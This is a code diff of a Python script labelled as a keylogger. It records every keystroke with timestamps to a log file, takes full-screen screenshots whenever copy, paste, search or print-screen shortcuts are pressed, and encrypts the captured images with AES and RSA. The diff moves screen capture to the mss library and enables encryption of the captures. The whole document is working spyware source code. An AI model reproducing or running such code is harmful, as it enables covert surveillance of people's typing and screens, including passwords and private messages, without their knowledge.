@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener
-import pyautogui
+from mss import mss
 import datetime
+import string
 import time
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
@@ -11,37 +12,56 @@ from Crypto.Util.Padding import pad, unpad
 
 # keyloger
 def keystroke(key):
+
+    letter = string.ascii_letters
+    lt = 0
+    t = str(datetime.datetime.now().strftime("%H : %M : %S >> "))
     key = str(key).replace("'","")
        
     if key == "\\x03":
-        key = "\nshortcut Copy\n"
+        lt = 0
+        key = "_Copy"
         capturekey("_Copy")
     if key == "\\x16":
-        key = "\nshortcut Paste\n"
+        lt = 0
+        key = "_Paste"
         capturekey("_Paste")
     if key == "\\x06":
-        key = "\nshortcut search\n"
+        lt = 0
+        key = "_search"
         capturekey("_Search")
     if key == "Key.print_screen ":
-        key = "\nprint screen\n"
-        capturekey("_capture")
-    if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
-        key = ''
-    else:
-        key += ' '
-    
-    # print(key)Temp\\
+        lt = 0
+        key = "_print screen"
+        capturekey("_printsct")
+    # if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
+    #     key = ''
+    if( key in letter):
+        lt = 1
+    else :
+        lt = 0
+        key += '\n'
 
-    with open("Temp/log_interrupt.txt", 'a') as f:
-        f.write(key)
+    if lt == 0:
+        with open("Temp/log_data.txt", 'a') as f:
+        # with open("log_interrupt.txt", 'a') as f:
+            f.write(t + key)
 
 # capture
 def capturekey(k):
     time.sleep(1.2)
+    
     x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
-    x = x + k + '.jpg'
-    pyautogui.screenshot().save('Temp\\Capture\\'+x)
-    # encrypt(x)
+    x = 'Temp\\Capture\\'+ x + k + '.jpg'
+
+    with mss() as sct:
+        sct.shot(mon=-1, output=x)
+
+    with open('Temp/Capture.txt', 'w') as f:
+        f.write(x + '\n')
+
+    # pyautogui.screenshot().save('Temp\\Capture\\'+x)
+    encrypt(x)
 
 def encrypt(file):
     print("encrypt\n")
@@ -76,7 +96,7 @@ def encrypt(file):
         f.write(enc)
         f.write(datac)
 
-    decrypt(file)
+    # decrypt(file)
     
 def decrypt(file):
     print("decrypt\n")
@@ -87,8 +107,6 @@ def decrypt(file):
     with open(file, 'rb') as f:
         lock = f.read(256)
         text = f.read()
-
-    files = 'decrypt' + file
 
     pvt = RSA.import_key(open('File_Generate/Private_Key.pem').read())
     pvtkey = PKCS1_v1_5.new(pvt)
@@ -101,10 +119,10 @@ def decrypt(file):
     if obj == digest.digest() :
         print("true")
 
-        with open(files, 'wb') as f:
+        with open(file, 'wb') as f:
             f.write(text)
 
-        with open(files, 'rb') as f:
+        with open(file, 'rb') as f:
             iv = f.read(16)
             data = f.read()
         cipher = AES.new(k, AES.MODE_CBC, iv)
@@ -112,12 +130,11 @@ def decrypt(file):
 
         plaintext = unpad(plaintext, AES.block_size)
 
-        with open(files, 'wb') as f:
+        with open(file, 'wb') as f:
             f.write(plaintext)
 
     else :
         print("false")
-
 
 with Listener(on_press=keystroke) as l:
     l.join()
